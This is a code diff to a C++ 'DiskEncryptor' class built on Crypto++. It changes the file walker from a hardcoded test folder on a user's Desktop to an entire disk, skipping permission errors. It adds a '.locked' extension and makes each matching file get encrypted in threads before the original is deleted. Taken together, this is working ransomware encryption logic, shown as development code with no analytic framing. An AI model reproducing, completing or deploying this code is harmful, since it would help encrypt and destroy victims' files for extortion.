@@ -9,6 +9,8 @@
 #include "diskencryptor.h"
 
 #define MAX_THREADS 3
+#define FILE_EXTENSION ".locked"
+
 
 bool DiskEncryptor::setDisk(std::string disk)
 {
@@ -34,36 +36,57 @@ bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByte
 }
 
 void DiskEncryptor::iterateFiles() {
+	std::cout << "Iterating files in disk: " << _disk << std::endl;
 	std::vector<std::thread> threads;
-	
-	for (const auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\mXn\\Desktop\\fwareTest")) {
-		if (entry.is_directory()) {
-			continue;
-		}
-		else {
-			std::string ext = entry.path().extension().string();
-			for (std::string e : ext2Ecrypt) {
-				if (_freespace < entry.file_size()) {
-					break;
-				}
-				if (ext == e) {
-					if (threads.size() > 3) {
-						for (std::thread& t : threads) {
-							t.join();
-						}
-						threads.clear();
+	for (auto& entry : std::filesystem::recursive_directory_iterator(_disk, std::filesystem::directory_options::skip_permission_denied)) {
+		try {
+			if (entry.is_directory()) {
+				
+			}
+			else {
+				std::string ext = entry.path().extension().string();
+				for (std::string e : ext2Ecrypt) {
+					if (_freespace < entry.file_size()) {
+						break;
 					}
-					threads.emplace_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
+					if (ext == e) {
+						if (threads.size() > MAX_THREADS) {
+							for (std::thread& t : threads) {
+								t.join();
+							}
+							threads.clear();
+						}
+						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
+					}
+
 				}
 			}
 		}
+		catch (std::exception e) {
+			std::cout << e.what() << std::endl;
+			continue;
+	}
+	
+	}
+	for (std::thread& t : threads) {
+		t.join();
+	
 	}
 }
 
+std::string* DiskEncryptor::getDisk() {
+	return &_disk;
+}
+
 bool DiskEncryptor::fileEncrypt(std::string file) {
+	std::cout << "Encrypting file: " << file << std::endl;
 	std::ifstream in(file, std::ios::binary);
 	std::ofstream out(file + FILE_EXTENSION, std::ios::binary);
 	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
+	in.close();
+	out.close();
+	std::filesystem::remove(file);
+	return true;
 }
 
 DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
@@ -75,5 +98,5 @@ DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, Cryp
 
 DiskEncryptor::~DiskEncryptor()
 {
-	//delete _disk;
+
 }
